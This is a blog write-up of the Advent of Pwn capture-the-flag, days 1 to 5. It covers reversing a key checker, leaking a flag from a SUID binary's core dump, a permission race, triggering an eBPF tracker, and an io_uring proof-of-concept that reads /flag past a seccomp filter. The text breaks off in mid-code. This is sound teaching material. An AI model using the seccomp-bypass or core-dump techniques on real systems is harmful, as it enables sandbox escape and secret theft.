---
title:  "[CTF] PWN.COLLEGE - Advent of Pwn."
categories: [CTF, pwn.college]
---

![Logo](/assets/images/santa-cyber.png)

[Advent of Pwn](https://pwn.college/advent-of-pwn/) is an Advent CTF created by the awesome team at [ASU](https://www.asu.edu) behind [pwn.college](http://pwn.college/). This year was its first edtion. In this post I'll go through my solutions and share some of the things I've learnt along the way. Having time available mostly at odd evening hours, I finished only 9/12 challenges during the CTF and worked on the rest of them later. If you haven't stumbled upon [other](https://www.feyrer.de/CTF/CTF-Writeup-pwn.college-AdventOfPwn2025/) [solutions](https://jia.je/ctf-writeups/2025-12-01-advent-of-pwn-2025/) [already](https://github.com/hidehiroanto/ctf-writeups/tree/main/advent-of-pwn/2025) before landing on this page, please do check them out as you might find some more elegant ideas from seasoned CTF players. Especially for levels 5, which was a bit trickier, and 6 which had multiple solutions.  

Before going into the technical solutions, a few words about LLMs, which seem to be the theme nowadays. During the CTF I relied on LLMs for a couple of tasks which I believe they proved really useful at:
* Making sense of large amounts of code, high level or disassembly.
* Getting started with complicated subjects (e.g. understanding a custom blockchain).
* Repetitive tasks when speed or code quality is not a concern.

Multiple friends I've talked to during the CTF were skeptic about using LLMs and I definitely understand why. Some drawbacks I've experienced _continously_, not just during this CTF but in general:
* It's really easy to get directed to rabbit holes or ideas that don't lead anywhere.
* Very often they miss good ideas.
* They suggest paths which appear correct and seem to make sense, but are either very inefficient or simply wrong.
* On advanced topics, or things for which simply there's not much information available (for example level 5 shellcode for `io_uring` async I/O here), no amount of vibe-researching will get you to the solution.
* Again, not much chance against esoteric topics like pwn.college's [The Art of the Shell](https://pwn.college/shell-lin-do~148f65dd/) or [Linux Lunacy](https://pwn.college/linux-lunacy~9b739db1/) modules, which are awesome BTW.

Last but definitely not least, huge thanks to the creators of these challenges for the effort of designing and making them available for everyone!

Solutions and all challenge files to follow along are also on [GitHub](https://github.com/livz/advent-of-pwn). Challenge descriptions were fun to read but I think they didn't add much useful information towards solving them. So, for brevity I'm ommiting them here. 

[Day 1 - Warm-up gatekeeper](#day-1---warm-up-gatekeeper)<br>
[Day 2 - Dumpable SUID binary](#day-2---dumpable-suid-binary)<br>
[Day 3 - Sleeping nicely](#day-3---sleeping-nicely)<br>
[Day 4 - eBPF filters](#day-4---ebpf-filters)<br>
[Day 5 - io_uring syscall filter bypass](#day-5---io_uring-syscall-filter-bypass)

## Day 1 - Warm-up gatekeeper

In this challenge we're dealing with an ELF 😛 file that performs some checks on its input:

```bash
$ file /challenge/check-list
/challenge/check-list: setuid ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, BuildID[sha1]=de16e5b4aea576aabe09d12729be47c53ff6e586, stripped

$ pwn checksec /challenge/check-list
[*] '/challenge/check-list'
    Arch:       amd64-64-little
    RELRO:      No RELRO
    Stack:      No canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        No PIE (0x400000)
    Stack:      Executable
```

The code is really massive (1M+ lines of disassembly in Ghidra) but quite eays to understand. We're dealing with a large array of input bytes:
```nasm
mov     rbp, rsp
sub     rsp, 500h
mov     eax, 0
mov     edi, 0          ; fd
lea     rsi, [rbp+var_400] ; buf
mov     edx, 400h       ; count
syscall                 ; LINUX - sys_read
```

And thousands of basic operations (`sub` and `add`) applied on each element. Towards the end there are some checks on each array element. If we pass all the checks we get the flag:
```nasm
jnz     wrong_byte
cmp     [rbp+var_1], 7Dh ; '}'
jnz     wrong_byte
mov     rax, 1
mov     rdi, 1          ; fd
lea     rsi, bufCorrectStart ; buf
mov     rdx, 31h ; '1'  ; count
syscall                 ; LINUX - sys_write
mov     eax, 2
lea     rdi, filename   ; Open flag
mov     esi, 0          ; flags
mov     edx, 0          ; mode
syscall                 ; LINUX - sys_open
cmp     rax, 0
jl      short loc_AA40B6
mov     r12, rax
mov     eax, 0
mov     rdi, r12        ; fd
lea     rsi, [rbp+var_500] ; buf
mov     edx, 100h       ; count
syscall                 ; LINUX - sys_read
cmp     rax, 0
jle     short loc_AA40B6
mov     rcx, rax
mov     rax, 1
mov     rdi, 1          ; fd
lea     rsi, [rbp+var_500] ; buf
mov     rdx, rcx        ; count
syscall                 ; LINUX - sys_write
cmp     rax, 0
jl      short loc_AA40B6
mov     eax, 3Ch ; '<'
mov     edi, 0          ; error_code
syscall                 ; LINUX - sys_exit
```

For this level, once you understand what's happening a simple Python script can parse all the code, extract the operations and final value for each array element and reverse them to get the expected input key:
```python
~ python3 day-01-reconstruct-key.py
--- Key Reconstruction Complete ---
Key length: 1024 bytes

Successfully wrote the reconstructed key to 'reconstructed_key.bin' (binary format).
~ scp reconstructed_key.bin hacker@dojo.pwn.college:/home/hacker
reconstructed_key.bin
```

Then get the flag:
```bash
$ /challenge/check-list < reconstructed_key.bin
✨ Correct: you checked it twice, and it shows!
pwn.college{cqFsdOJjQoO-immwxNL7kN4DOFJ.QX4UDOxIDLzQDMyQzW}
```

## Day 2 - Dumpable SUID binary

Another ELF binary:
```bash
$ pwn checksec /challenge/claus
[*] '/challenge/claus'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        PIE enabled
    Stripped:   No
```

But this time we have its source:
```c
#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

char gift[256];

void wrap(char *gift, size_t size)
{
    fprintf(stdout, "Wrapping gift: [          ] 0%%");
    for (int i = 0; i < size; i++) {
        sleep(1);
        gift[i] = "#####\n"[i % 6];
        int progress = (i + 1) * 100 / size;
        int bars = progress / 10;
        fprintf(stdout, "\rWrapping gift: [");
        for (int j = 0; j < 10; j++) {
            fputc(j < bars ? '=' : ' ', stdout);
        }
        fprintf(stdout, "] %d%%", progress);
        fflush(stdout);
    }
    fprintf(stdout, "\n🎁 Gift wrapped successfully!\n\n");
}

void sigtstp_handler(int signum)
{
    puts("🎅 Santa won't stop!");
}

int main(int argc, char **argv, char **envp)
{
    uid_t ruid, euid, suid;

    if (getresuid(&ruid, &euid, &suid) == -1) {
        perror("getresuid");
        return 1;
    }

    if (euid != 0) {
        fprintf(stderr, "❌ Error: Santa must wrap as root!\n");
        return 1;
    }

    if (ruid != 0) {
        if (setreuid(0, -1) == -1) {
            perror("setreuid");
            return 1;
        }

        fprintf(stdout, "🦌 Now, Dasher! now, Dancer! now, Prancer and Vixen!\nOn, Comet! on Cupid! on, Donder and Blitzen!\n\n");
        execve("/proc/self/exe", argv, envp);

        perror("execve");
        return 127;
    }

    if (signal(SIGTSTP, sigtstp_handler) == SIG_ERR) {
        perror("signal");
        return 1;
    }

    int fd = open("/flag", O_RDONLY);
    if (fd == -1) {
        perror("open");
        return 1;
    }

    int count = read(fd, gift, sizeof(gift));
    if (count == -1) {
        perror("read");
        return 1;
    }

    wrap(gift, count);

    puts("🎄 Merry Christmas!\n");
    puts(gift);

    return 0;
}
```

Day 2 has a short init script that modifies the pattern for core files, to be in line with the challenge descrption:
```bash
#!/bin/sh

set -eu

mount -o remount,rw /proc/sys
echo coal > /proc/sys/kernel/core_pattern
mount -o remount,ro /proc/sys
```

The plan for this one is straight-forward: trigger a core dump then find the flag, which should still have been in memory. To do that, first make sure to set the core size:
```bash
$ ulimit -c
0
$ ulimit -c unlimited
$ ulimit -c
unlimited
```

There might be other ways but I went for a SIGQUIT (**Ctrl + \**))which triggers a core dump:
```bash
$ /challenge/claus
🦌 Now, Dasher! now, Dancer! now, Prancer and Vixen!
On, Comet! on Cupid! on, Donder and Blitzen!

Wrapping gift: [          ] 1%^\Quit (core dumped)

$ ls -al coal
-rw------- 1 root ubuntu 425984 Dec  2 19:41 coal
```

There are multiple ways to extract the flag as well, but I wanted to see if I could find it in the core using GDB:
```bash
gdb /challenge/claus ~/coal

gef➤  bt
#0  0x00007f51c4d86a7a in clock_nanosleep () from /lib/x86_64-linux-gnu/libc.so.6
#1  0x00007f51c4d93a27 in nanosleep () from /lib/x86_64-linux-gnu/libc.so.6
#2  0x00007f51c4da8c93 in sleep () from /lib/x86_64-linux-gnu/libc.so.6
#3  0x0000557a2330723d in wrap ()
#4  0x0000557a2330755b in main ()

gef➤  x/7i $rip
=> 0x557a2330755b <main+452>:   lea    rax,[rip+0xbf9]        # 0x557a2330815b
   0x557a23307562 <main+459>:   mov    rdi,rax
   0x557a23307565 <main+462>:   call   0x557a23307030 <puts@plt>
   0x557a2330756a <main+467>:   lea    rax,[rip+0x2b4f]        # 0x557a2330a0c0 <gift>
   0x557a23307571 <main+474>:   mov    rdi,rax
   0x557a23307574 <main+477>:   call   0x557a23307030 <puts@plt>
   0x557a23307579 <main+482>:   mov    eax,0x0

gef➤  x/s 0x557a2330a0c0
0x557a2330a0c0 <gift>:  "##n.college{4vYY1y_EKEbWDpks1zEp7C7y8mm.QX4cDOxIDLzQDMyQzW}\n"
```

## Day 3 - Sleeping nicely

<blockquote>
  <p>Only when children sleep sweetly and nice does Santa begin his flight</p>
</blockquote>

Despite having a massive description, this is another short and sweet one. The challenge has an init script which launches the folowing script in the background:

```bash
#!/bin/sh

set -eu

GIFT="$(cat /flag)"
rm /flag

touch /stocking

sleeping_nice() {
    ps ao ni,comm --no-headers \
        | awk '$1 > 0' \
        | grep -q sleep
}

# Only when children sleep sweetly and nice does Santa begin his flight
until sleeping_nice; do
    sleep 0.1
done

chmod 400 /stocking
printf "%s" "$GIFT" > /stocking

```

When nice sleep is detected, Santa will drop the flag, but not before making the stocking unreadble. Naughty! The idea is to open the `/stocking` file before Santa changes its permissions, then sleep nicely:

```bash
$ ls /stocking
-rw-r--r-- 1 root root 0 Dec  3 12:48 /stocking

$ tail -f /stocking
pwn.college{sucGPgrXk1E5Phyq-QhxTqXukrZ.QX0gDOxIDLzQDMyQzW}

- Challenge is already running. Start sleeping nicely

$ nice -n 10 sleep 1
```

## Day 4 - eBPF filters

Another init file which runs a compiled ELF binary, and its source is available. Since it's not very long, I'll paste it here:
```c
#define _GNU_SOURCE
#include <bpf/bpf.h>
#include <bpf/libbpf.h>
#include <stdbool.h>
#include <ctype.h>
#include <dirent.h>
#include <errno.h>
#include <fcntl.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/resource.h>
#include <unistd.h>

static volatile sig_atomic_t stop;

static void handle_sigint(int sig)
{
    (void)sig;
    stop = 1;
}

static int libbpf_print_fn(enum libbpf_print_level level,
                           const char *fmt, va_list args)
{
    return vfprintf(stderr, fmt, args);
}

static void broadcast_cheer(void)
{
    libbpf_set_print(libbpf_print_fn);
    libbpf_set_strict_mode(LIBBPF_STRICT_ALL);

    DIR *d = opendir("/dev/pts");
    struct dirent *de;
    char path[64];
    char flag[256];
    char banner[512];
    ssize_t n;

    if (!d)
        return;

    int ffd = open("/flag", O_RDONLY | O_CLOEXEC);
    if (ffd >= 0) {
        n = read(ffd, flag, sizeof(flag) - 1);
        if (n >= 0)
            flag[n] = '\0';
        close(ffd);
    } else {
        strcpy(flag, "no-flag\n");
    }

    snprintf(
        banner,
        sizeof(banner),
        "🎅 🎄 🎁 \x1b[1;31mHo Ho Ho\x1b[0m, \x1b[1;32mMerry Christmas!\x1b[0m\n"
        "%s",
        flag);

    while ((de = readdir(d)) != NULL) {
        const char *name = de->d_name;
        size_t len = strlen(name);
        bool all_digits = true;

        if (len == 0 || name[0] == '.')
            continue;
        if (strcmp(name, "ptmx") == 0)
            continue;

        for (size_t i = 0; i < len; i++) {
            if (!isdigit((unsigned char)name[i])) {
                all_digits = false;
                break;
            }
        }
        if (!all_digits)
            continue;

        snprintf(path, sizeof(path), "/dev/pts/%s", name);
        int fd = open(path, O_WRONLY | O_NOCTTY | O_CLOEXEC);
        if (fd < 0)
            continue;
        write(fd, "\x1b[2J\x1b[H", 7);
        write(fd, banner, strlen(banner));
        close(fd);
    }

    closedir(d);
}

int main(void)
{
    struct bpf_object *obj = NULL;
    struct bpf_program *prog = NULL;
    struct bpf_link *link = NULL;
    struct bpf_map *success = NULL;
    int map_fd;
    __u32 key0 = 0;
    int err;
    int should_broadcast = 0;

    libbpf_set_strict_mode(LIBBPF_STRICT_ALL);
    setvbuf(stdout, NULL, _IONBF, 0);

    obj = bpf_object__open_file("/challenge/tracker.bpf.o", NULL);
    if (!obj) {
        fprintf(stderr, "Failed to open BPF object: %s\n", strerror(errno));
        return 1;
    }

    err = bpf_object__load(obj);
    if (err) {
        fprintf(stderr, "Failed to load BPF object: %s\n", strerror(-err));
        goto cleanup;
    }

    prog = bpf_object__find_program_by_name(obj, "handle_do_linkat");
    if (!prog) {
        fprintf(stderr, "Could not find BPF program handle_do_linkat\n");
        goto cleanup;
    }

    link = bpf_program__attach_kprobe(prog, false, "__x64_sys_linkat");
    if (!link) {
        fprintf(stderr, "Failed to attach kprobe __x64_sys_linkat: %s\n", strerror(errno));
        goto cleanup;
    }

    signal(SIGINT, handle_sigint);
    signal(SIGTERM, handle_sigint);

    success = bpf_object__find_map_by_name(obj, "success");
    if (!success) {
        fprintf(stderr, "Failed to find success map\n");
        goto cleanup;
    }
    map_fd = bpf_map__fd(success);

    printf("Attached. Press Ctrl-C to quit.\n");
    fflush(stdout);
    while (!stop) {
        __u32 v = 0;
        if (bpf_map_lookup_elem(map_fd, &key0, &v) == 0 && v != 0) {
            should_broadcast = 1;
            stop = 1;
            break;
        }
        usleep(100000);
    }

    if (should_broadcast) {
        printf("Ho Ho Ho\n");
        broadcast_cheer();
    }

cleanup:
    if (link)
        bpf_link__destroy(link);
    if (obj)
        bpf_object__close(obj);
    return err ? 1 : 0;
}
```
Basically the challenge loads a BPF filter from a compiled object file - `tracker.bpf.o` (Sorry, no source code available this time), locates a BPF program (`handle_do_linkat`) and attaches a probe to it then gets a handle to a `success` map. It then continously checks for the presence of a first element in it with a value different than 0. To get an idea about the compiled eBPF filter, list all the sections:

```bash
$ llvm-objdump -h /challenge/tracker.bpf.o

/challenge/tracker.bpf.o:       file format elf64-bpf

Sections:
Idx Name                        Size     VMA              Type
  0                             00000000 0000000000000000
  1 .strtab                     0000008f 0000000000000000
  2 .text                       00000000 0000000000000000 TEXT
  3 kprobe/__x64_sys_linkat     000008a8 0000000000000000 TEXT
  4 .relkprobe/__x64_sys_linkat 00000030 0000000000000000
  5 license                     0000000d 0000000000000000 DATA
  6 .maps                       00000040 0000000000000000 DATA
  7 .BTF                        00000937 0000000000000000
  8 .rel.BTF                    00000030 0000000000000000
  9 .BTF.ext                    00000560 0000000000000000
 10 .rel.BTF.ext                00000530 0000000000000000
 11 .llvm_addrsig               00000004 0000000000000000
 12 .symtab                     00000090 0000000000000000
```

And then peek inside the custom `linkat` handler:
```bash
$ llvm-objdump -d -j kprobe/__x64_sys_linkat /challenge/tracker.bpf.o
 challenge/tracker.bpf.o:	file format elf64-bpf

Disassembly of section kprobe/__x64_sys_linkat:

0000000000000000 <handle_do_linkat>:
       0:	79 16 70 00 00 00 00 00	r6 = *(u64 *)(r1 + 0x70)
       1:	b7 01 00 00 00 00 00 00	r1 = 0x0
       2:	7b 1a d0 ff 00 00 00 00	*(u64 *)(r10 - 0x30) = r1
       3:	7b 1a c8 ff 00 00 00 00	*(u64 *)(r10 - 0x38) = r1
       4:	15 06 0e 01 00 00 00 00	if r6 == 0x0 goto +0x10e <handle_do_linkat+0x898>
       5:	bf 63 00 00 00 00 00 00	r3 = r6
       6:	07 03 00 00 68 00 00 00	r3 += 0x68
       7:	bf a1 00 00 00 00 00 00	r1 = r10
       8:	07 01 00 00 d0 ff ff ff	r1 += -0x30
       9:	b7 02 00 00 08 00 00 00	r2 = 0x8
      10:	85 00 00 00 71 00 00 00	call 0x71
      11:	07 06 00 00 38 00 00 00	r6 += 0x38
      12:	bf a1 00 00 00 00 00 00	r1 = r10
      13:	07 01 00 00 c8 ff ff ff	r1 += -0x38
      14:	b7 02 00 00 08 00 00 00	r2 = 0x8
      15:	bf 63 00 00 00 00 00 00	r3 = r6
      16:	85 00 00 00 71 00 00 00	call 0x71
      17:	79 a3 d0 ff 00 00 00 00	r3 = *(u64 *)(r10 - 0x30)
      18:	15 03 00 01 00 00 00 00	if r3 == 0x0 goto +0x100 <handle_do_linkat+0x898>
      19:	79 a1 c8 ff 00 00 00 00	r1 = *(u64 *)(r10 - 0x38)
      20:	15 01 fe 00 00 00 00 00	if r1 == 0x0 goto +0xfe <handle_do_linkat+0x898>
      21:	bf a1 00 00 00 00 00 00	r1 = r10
      22:	07 01 00 00 d8 ff ff ff	r1 += -0x28
      23:	b7 02 00 00 10 00 00 00	r2 = 0x10
      24:	85 00 00 00 72 00 00 00	call 0x72
      25:	67 00 00 00 20 00 00 00	r0 <<= 0x20
      26:	c7 00 00 00 20 00 00 00	r0 s>>= 0x20
      27:	b7 01 00 00 01 00 00 00	r1 = 0x1
      28:	6d 01 f6 00 00 00 00 00	if r1 s> r0 goto +0xf6 <handle_do_linkat+0x898>
      29:	79 a3 d0 ff 00 00 00 00	r3 = *(u64 *)(r10 - 0x30)
      30:	bf a1 00 00 00 00 00 00	r1 = r10
      31:	07 01 00 00 f0 ff ff ff	r1 += -0x10
      32:	b7 02 00 00 10 00 00 00	r2 = 0x10
      33:	85 00 00 00 72 00 00 00	call 0x72
      34:	67 00 00 00 20 00 00 00	r0 <<= 0x20
      35:	77 00 00 00 20 00 00 00	r0 >>= 0x20
      36:	55 00 ee 00 07 00 00 00	if r0 != 0x7 goto +0xee <handle_do_linkat+0x898>
      37:	71 a1 f0 ff 00 00 00 00	r1 = *(u8 *)(r10 - 0x10)
      38:	55 01 ec 00 73 00 00 00	if r1 != 0x73 goto +0xec <handle_do_linkat+0x898> // s
      39:	71 a1 f1 ff 00 00 00 00	r1 = *(u8 *)(r10 - 0xf)
      40:	55 01 ea 00 6c 00 00 00	if r1 != 0x6c goto +0xea <handle_do_linkat+0x898> // l
      41:	71 a1 f2 ff 00 00 00 00	r1 = *(u8 *)(r10 - 0xe)
      42:	55 01 e8 00 65 00 00 00	if r1 != 0x65 goto +0xe8 <handle_do_linkat+0x898> // e
      43:	71 a1 f3 ff 00 00 00 00	r1 = *(u8 *)(r10 - 0xd)
      44:	55 01 e6 00 69 00 00 00	if r1 != 0x69 goto +0xe6 <handle_do_linkat+0x898> // i
      45:	71 a1 f4 ff 00 00 00 00	r1 = *(u8 *)(r10 - 0xc)
      46:	55 01 e4 00 67 00 00 00	if r1 != 0x67 goto +0xe4 <handle_do_linkat+0x898> // g
      47:	71 a1 f5 ff 00 00 00 00	r1 = *(u8 *)(r10 - 0xb)
      48:	55 01 e2 00 68 00 00 00	if r1 != 0x68 goto +0xe2 <handle_do_linkat+0x898> // h
      49:	79 a3 c8 ff 00 00 00 00	r3 = *(u64 *)(r10 - 0x38)
      50:	bf a1 00 00 00 00 00 00	r1 = r10
      51:	07 01 00 00 d8 ff ff ff	r1 += -0x28
      52:	b7 02 00 00 10 00 00 00	r2 = 0x10
      53:	85 00 00 00 72 00 00 00	call 0x72
      54:	67 00 00 00 20 00 00 00	r0 <<= 0x20
      55:	c7 00 00 00 20 00 00 00	r0 s>>= 0x20
      56:	b7 01 00 00 01 00 00 00	r1 = 0x1
 [...]
```

The disassembly is quite large but repetitive. At this point I used an LLM to do a first pass thrugh the decompiled code with mixed results. What I got was that the binary running as SUID _will broadcast the flag when an unprivileged process executes the linkat system call, and the newpath argument must point to a string that exactly matches: "prancer"_. Although this wasn't correct, it was a good starting point. 

Before recovering all the expected arguments to `linkat` from the disassembly, I wanted to understand a bit more the eBPF filter, so I recompiled the binary with debug information. To do this, we need `libbpf` and some includes:

```bash
$ LIBBPF_ROOT=/nix/store/b9zasiadhppl3kbn3jlfvvssc35hhavq-libbpf-1.5.0

$ sudo gcc -o northpole -Wall -g northpole.c \
-I${LIBBPF_ROOT}/include \
-L${LIBBPF_ROOT}/lib \
-lbpf
```

The BPF program actually defines two maps:
```bash
$ sudo bpftool map show
1: array  name progress  flags 0x0
	key 4B  value 4B  max_entries 1  memlock 272B
	btf_id 12
2: array  name success  flags 0x0
	key 4B  value 4B  max_entries 1  memlock 272B
	btf_id 12
```

The first one is used to track the progress from one link to another, almost like a state machine. That's why the order of the link operations matter (more on this next). The second map is the one checked by the C program for success. We can also dump the maps with `bpftool`:
```bash
$ sudo bpftool map dump name progress
[{
        "key": 0,
        "value": 1
    }
]
$ sudo bpftool map dump name success
[{
        "key": 0,
        "value": 0
    }
]
```
Or even manually set values for elements, to confirm the understanding of the code is correct:
```bash
$ sudo bpftool map update name success key hex 00 00 00 00 value hex 01 00 00 00
$ sudo bpftool map dump name success
[{
        "key": 0,
        "value": 1
    }
]
```

To trigger the winning path we need a chain of link operations. Let's see if this works or not:
```bash
$ touch sleigh
$ sudo bpftool map dump name progress
[{
        "key": 0,
        "value": 0
    }
]
$ ln sleigh dasher
$ sudo bpftool map dump name progress
[{
        "key": 0,
        "value": 1
    }
]
```
We made progress! Next step was to get the name of the other reindeers and their order (_which by the way it doesn't match the song, so you still have to find them all_) and get the 🚩:
```bash
$ touch sleigh
$ ln sleigh dasher
$ ln sleigh dancer
$ ln sleigh prancer
$ ln sleigh vixen
$ ln sleigh comet
$ ln sleigh cupid
$ ln sleigh donner
$ ln sleigh blitzen

🎅 🎄 🎁 Ho Ho Ho, Merry Christmas!
pwn.college{I5Wgtp3zwRZOMihukp1FJYbSqCP.QXykDOxIDLzQDMyQzW}
```

## Day 5 - io_uring syscall filter bypass

<blockquote>
Dashing through the code,<br>
In a one-ring I/O sled,<br>
O’er the syscalls go,<br>
No blocking lies ahead!<br>
Buffers queue and spin,<br>
Completions shining bright,<br>
What fun it is to read and write,<br>
Async I/O tonight — hey!
</blockquote>

For this challenge the description is short but the solution took me a while to get it right (_especially the shellcode part_). The challlenge code is also short and very easy to understand:
```c
#include <errno.h>
#include <seccomp.h>
#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <linux/seccomp.h>

#define NORTH_POLE_ADDR (void *)0x1225000

int setup_sandbox()
{
    if (prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0) != 0) {
        perror("prctl(NO_NEW_PRIVS)");
        return 1;
    }

    scmp_filter_ctx ctx = seccomp_init(SCMP_ACT_KILL);
    if (!ctx) {
        perror("seccomp_init");
        return 1;
    }

    if (seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(io_uring_setup), 0) < 0 ||
        seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(io_uring_enter), 0) < 0 ||
        seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(io_uring_register), 0) < 0 ||
        seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit_group), 0) < 0) {
        perror("seccomp_rule_add");
        return 1;
    }

    if (seccomp_load(ctx) < 0) {
        perror("seccomp_load");
        return 1;
    }

    seccomp_release(ctx);

    return 0;
}

int main()
{
    void *code = mmap(NORTH_POLE_ADDR, 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
    if (code != NORTH_POLE_ADDR) {
        perror("mmap");
        return 1;
    }

    srand(time(NULL));
    int offset = (rand() % 100) + 1;

    puts("🛷 Loading cargo: please stow your sled at the front.");

    if (read(STDIN_FILENO, code, 0x1000) < 0) {
        perror("read");
        return 1;
    }

    puts("📜 Checking Santa's naughty list... twice!");
    if (setup_sandbox() != 0) {
        perror("setup_sandbox");
        return 1;
    }

    // puts("❄️ Dashing through the snow!");
    ((void (*)())(code + offset))();

    // puts("🎅 Merry Christmas to all, and to all a good night!");
    return 0;
}
```
The idea is clear: all the syscalls except `io_uring_setup`, `io_uring_enter` and `io_uring_register` are blocked and we get a mapped memory page to store some shellcode to be executed. Straght-forward but there are a few difficult things to overcome here:
* Not much related code available out there to work with `io_uring` (=> not much for LLMs to train with too)
* `io_uring_setup` syscall returns a file descriptor which needs to be `mmap`-ed, but `mmap` syscall is not allowed
* There's a large number of structures and member fields involved, whose offsets differ from one kernel version to another (=> LLMs will likely fail to generate any working shellcode).

My plan was as follows:
1. Locate a working example for `io_uring` async I/O.
2. Adapt the example to open a file, read and write its content to stdout.
3. Convert it to shellcode and feed it to the challenge binary
4. Enjoy!

Luckily towards the end of the `io_uring` [man page](https://man7.org/linux/man-pages/man7/io_uring.7.html) there's an example that uses `io_uring` to copy stdin to stdout. Nice, let's see if it works:
```bash
$ gcc io_uring_orig.c -o io_uring
ubuntu@2025~day-05:~$ ./io_uring
hello
hello
```

Next, clean the code and adapt it to read and print the flag:
```bash
$ gcc io_uring_mod.c -o io_uring
ubuntu@practice~2025~day-05:~$ sudo ./io_uring
pwn.college{practice}
```

But how to get rid of the need to `mmap` stuff?  By default, `io_uring` allocates kernel memory for submission queue and completion queue, that callers must subsequently `mmap`.  However, consulting the `io_uring_setup` man page I noticed the `IORING_SETUP_NO_MMAP` flag. As per documentaiont, if this flag is set, io_uring instead uses caller-allocated buffers:  `p->cq_off.user_addr` must point to the memory for the `sq`/`cq` rings, and `p->sq_off.user_addr` must point to the memory for the `sqes`. Neat! 

I've trimmed the PoC even more and simulated the conditions of the challege binary with two page-aligned (very important) buffers on the stack:
```c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <unistd.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <fcntl.h>
#include <linux/io_uring.h>
#include <stdlib.h>
#include <errno.h>

/* Define Page Size */
#define PAGE_SIZE 4096

static int ring_fd;
static struct io_uring_sqe *sqes;
static struct io_uring_cqe *cqes;

static uint32_t *sq_tail, *sq_head, *sq_mask;
static uint32_t *cq_tail, *cq_head, *cq_mask;

static inline int enter_syscall(int to_submit, int min_complete) {
    return syscall(__NR_io_uring_enter, ring_fd,
                   to_submit, min_complete,
                   IORING_ENTER_GETEVENTS, NULL, 0);
}

/* setup accepts pointers to the pre-allocated stack memory */
static void setup(void *rings_ptr, void *sqes_ptr) {
    struct io_uring_params p = {0};

    p.sq_entries = 1;
    p.cq_entries = 1;
    p.flags = IORING_SETUP_NO_MMAP | IORING_SETUP_NO_SQARRAY;

    /* Tell kernel where the memory is */
    p.cq_off.user_addr = (uint64_t)(unsigned long)rings_ptr;
    p.sq_off.user_addr = (uint64_t)(unsigned long)sqes_ptr;

    ring_fd = syscall(__NR_io_uring_setup, 8, &p);
    if (ring_fd < 0) {
        perror("io_uring_setup");
        exit(1);
    }

    /* SQEs: user-provided sqes_ptr */
    sqes = (struct io_uring_sqe *)sqes_ptr;

    /* Map offsets to our stack buffer */
    void *ring_base = rings_ptr;
    sq_head = (uint32_t *)((char *)ring_base + p.sq_off.head);
    sq_tail = (uint32_t *)((char *)ring_base + p.sq_off.tail);
    sq_mask = (uint32_t *)((char *)ring_base + p.sq_off.ring_mask);

    cq_head = (uint32_t *)((char *)ring_base + p.cq_off.head);
    cq_tail = (uint32_t *)((char *)ring_base + p.cq_off.tail);
    cq_mask = (uint32_t *)((char *)ring_base + p.cq_off.ring_mask);
    cqes = (struct io_uring_cqe *)((char *)ring_base + p.cq_off.cqes);
}

static int submit_sqe(struct io_uring_sqe *sqe) {
    uint32_t t = *sq_tail;
    uint32_t idx = t & *sq_mask;
    printf("[*] submit_sqe: %d\n", idx);

    memcpy(&sqes[idx], sqe, sizeof(*sqe));
    *sq_tail = t + 1;

    if (enter_syscall(1, 1) < 0) { perror("enter"); _exit(1); }

    while (*cq_head == *cq_tail) ;
    uint32_t cidx = *cq_head & *cq_mask;
    int res = cqes[cidx].res;
    (*cq_head)++;

    return res;
}

int main() {
    /* 1. Allocate on Stack 
       2. Use __attribute__((aligned(PAGE_SIZE)))
       3. Zero out memory (mmap does this automatically, stack does not)
    */
    uint8_t rings_stack[PAGE_SIZE] __attribute__((aligned(PAGE_SIZE)));
    uint8_t sqes_stack[PAGE_SIZE] __attribute__((aligned(PAGE_SIZE)));

    memset(rings_stack, 0, PAGE_SIZE);
    memset(sqes_stack, 0, PAGE_SIZE);

    /* Pass stack addresses to setup */
    setup(rings_stack, sqes_stack);

    char path[] = "/flag";
    char buf[4096];

    struct io_uring_sqe sqe;
    memset(&sqe, 0, sizeof(sqe));
    sqe.opcode = IORING_OP_OPENAT;
    sqe.fd = AT_FDCWD;
    sqe.addr = (unsigned long)path;
    sqe.open_flags = O_RDONLY;

    int fd = submit_sqe(&sqe);
    if (fd < 0) {
        write(2, "open failed\n", 12);
        return 1;
    }
    printf("[*] File opened with fd: %x\n", fd);

    memset(&sqe, 0, sizeof(sqe));
    sqe.opcode = IORING_OP_READ;
    sqe.fd = fd;
    sqe.addr = (unsigned long)buf;
    sqe.len = sizeof(buf);

    int r = submit_sqe(&sqe);
    if (r < 0) {
        write(2, "read failed\n", 12);
        return 1;
    }

    memset(&sqe, 0, sizeof(sqe));
    sqe.opcode = IORING_OP_WRITE;
    sqe.fd = 1;
    sqe.addr = (unsigned long)buf;
    sqe.len = r;

    submit_sqe(&sqe);

    return 0;
}
```

With this simple code we can get the falg without the need to `mmap` anything:

```bash
$ gcc io_uring_nommap.c -o io_uring
$ sudo ./io_uring
[*] submit_sqe: 0
[*] File opened with fd: 4
[*] submit_sqe: 1
[*] submit_sqe: 2
pwn.college{practice}
```

At this point I didn't realise I could have converted my PoC straight to working assembly code as other have done (_check the writeups mentioend in the beginning!_) and I manually converted this to shellcode. To make my job easier I minimised the PoC code even more, replaced all the defines with their actual values. I also made all the access to structure members to be offset-based (these offsets vary from one kernel version to another!) using the `offsetof` macro:
```c
printf("offsetof(struct io_uring_sqe, len): %d\n", offsetof(struct io_uring_sqe, len));
```

The result is this short snippet:
```c
#include <stdio.h>
#include <stdint.h>
#include <unistd.h>
#include <string.h>
